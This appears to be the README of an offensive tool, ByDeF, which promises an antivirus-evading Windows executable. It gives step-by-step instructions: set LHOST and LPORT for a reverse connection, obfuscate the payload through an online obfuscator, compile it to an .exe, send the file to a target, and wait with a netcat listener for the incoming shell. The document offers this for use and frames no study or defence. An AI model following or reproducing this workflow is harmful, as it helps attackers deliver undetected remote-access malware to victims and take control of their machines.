ByDeF : Generate an undetectable PE ( .exe ), which bypasses windows defender / AV

STEPS : 

1. Open "bydef.txt", then find and replace LHOST & LPORT with the host address and port for reverse connection and save.


2. Copy the content of "bydef.txt", visit "https://freecodingtools.org/tools/obfuscator/python" and paste the copied data, click on the play button, and you will have an obfuscated code at the right side.


3. Copy the obfuscated code then replace the content in the file "bydef_enc.py" with the obfuscated code which you copied, do not delete the "import subprocess" & "from subprocess import check_output" 


4. Run "bydef_compile.py", wait for the PE ( .exe ) to be generated, when it's done, you can find the executable file inside the "dist/" folder. ( this should be done on a Windows platform and not Unix ) 


5. Send the .exe file to your target.


6. Run "nc -nlvp port_no" and wait for connection.

# Buy Me A Coffee 
https://buymeacoffee.com/cyb3rf034r3ss
